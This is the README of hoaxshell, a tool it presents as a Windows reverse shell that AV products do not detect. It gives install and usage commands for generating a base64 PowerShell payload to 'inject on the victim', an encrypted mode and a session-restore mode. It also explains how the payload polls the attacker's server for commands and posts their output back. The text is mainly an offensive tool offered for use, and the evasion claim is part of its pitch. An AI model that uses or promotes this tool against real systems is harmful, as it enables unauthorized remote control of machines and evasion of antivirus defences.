# hoaxshell

[![Python 3.x](https://img.shields.io/badge/python-3.x-yellow.svg)](https://www.python.org/) 
<img src="https://img.shields.io/badge/powershell-%E2%89%A5%20v3.0-blue">
[![License](https://img.shields.io/badge/license-MIT-red.svg)](https://github.com/t3l3machus/hoaxshell/blob/main/LICENSE)
<img src="https://img.shields.io/badge/Maintained%3F-Yes-96c40f">
## Purpose

hoaxshell is an unconventional Windows reverse shell, currently undetected by Microsoft Defender and other AV solutions as it is solely based on http(s) traffic. The tool is easy to use, it produces it's own PowerShell base64 encoded or raw payload, it supports session restoration and encryption (ssl).  
  
So far, it has been tested on fully updated Windows 10 Pro and Windows 11 Enterprise boxes (see video and screenshots).
  
### Video Presentation  
https://www.youtube.com/

## Screenshots
![usage_example_png](https://raw.github.com/t3l3machus/hoaxshell/master/Screenshots/hoaxshell-1.png)
  
Find more screenshots [here](Screenshots/).

## Installation
```
git clone https://github.com/t3l3machus/hoaxshell
cd ./hoaxshell
sudo pip3 install -r requirements.txt
chmod +x hoaxshell.py
```

## Usage
#### Basic (shell session over http)
```
sudo python3 hoaxshell.py -s <your_ip>
```  
hoaxshell will generate the PowerShell payload automatically base64 encoded for you to copy and inject on the victim. If you need the payload raw, execute the "rawpayload" prompt command. After the payload has been executed on the victim, you'll be able to run PowerShell commands against it.

#### Encrypted shell session (https):
```
# Generate self-signed certificate:
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365

# Pass the cert.pem and key.pem as arguments:
sudo python3 hoaxshell.py -s <your_ip> -c </path/to/cert.pem> -k <path/to/key.pem>

```  

#### Restore session mode
In case you close your terminal accidentally, have a power outage or something, you can start hoaxshell in restore mode, it will attempt to re-establish a session, given that the payload is still running on the victim machine.
```
sudo python3 hoaxshell.py -s <your_ip> -g
```  
**Important**: Make sure to start hoaxshell with the same settings as the session you are trying to restore (http/https, port, etc).

## Limitations
The shell will die if you submit a command that initiates an interactive 

## How it Works
The attacker issued commands are basically hosted via http/https (python HTTPServer). The generated payload submits the victim's machine into a loop that periodically requests the commands from the attacker's malicious http(s) server, executes them and then sends the output back to the malicious server via POST requests.


